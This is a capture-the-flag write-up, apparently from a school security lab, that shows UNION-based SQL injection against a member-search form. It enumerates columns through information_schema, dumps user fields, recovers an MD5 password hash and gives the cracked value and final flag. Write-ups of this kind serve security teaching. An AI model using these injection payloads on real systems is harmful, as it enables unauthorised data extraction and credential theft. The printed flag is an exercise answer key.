

### Search members by ID

By entering an ID number, we can attempt to retrieve an initial table!

``
ID: 1 
First name: one
Surname : me
``

We can start by sending a SQL command:

``SELECT * FROM users``

``You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'SELECT * FROM users' at line 1``

We want to be able to use our own SELECT command and ignore the first one that gives an error. We can use the UNION method. The UNION keyword allows you to execute one or more additional SELECT queries and append the results to the original query.

We don't have the names of the columns, but thanks to ``information_schema``, which is default the database informations,  we can retrieve all the necessary data.

``1 UNION SELECT column_name, table_name FROM information_schema.columns``

```
ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
First name: user_id
Surname: users

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
First name: first_name
Surname: users

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
First name: last_name
Surname: users

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
First name: town
Surname: users

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
First name: country
Surname: users

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
First name: planet
Surname: users

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
First name: Commentaire
Surname: users

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
First name: countersign
Surname: users

```

We successfully retrieved all the corresponding tables and columns:

- user_id
- first_name
- last_name
- town
- country
- planet
- Commentaire
- countersign

Therefore, we can extract data from the users table with the following command:

``1 UNION SELECT first_name, country FROM users``

``` 
ID: 1 UNION SELECT first_name, country FROM users
First name: one
Surname: me

ID: 1 UNION SELECT first_name, country FROM users
First name: one
Surname: France

ID: 1 UNION SELECT first_name, country FROM users
First name: two
Surname: Finland

ID: 1 UNION SELECT first_name, country FROM users
First name: three
Surname: Ireland

ID: 1 UNION SELECT first_name, country FROM users
First name: Flag
Surname: 42
```

We have identified the table corresponding to the Flag; the rest should be in the other columns. A simple search among several columns will display the flag.

``1 UNION SELECT first_name, Commentaire FROM users``

```ID: 1 UNION SELECT first_name, Commentaire FROM users
First name: Flag
Surname: Decrypt this password -> then lower all the char. Sh256 on it and it's good!
```

``1 UNION SELECT first_name, countersign FROM users``

```ID: 1 UNION SELECT first_name, countersign FROM users
First name: Flag
Surname: 5ff9d0165b4f92b14994e5c685cdce28
```

###Decrypt the password

To decrypt the password, we use the MD5 Decrypt tool, converting ``5ff9d0165b4f92b14994e5c685cdce28`` to ``FortyTwo``. Following the instructions in the comment, we lower the characters to ``fortytwo``, and then encrypt it with a SHA-256 tool, resulting in ``10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5``.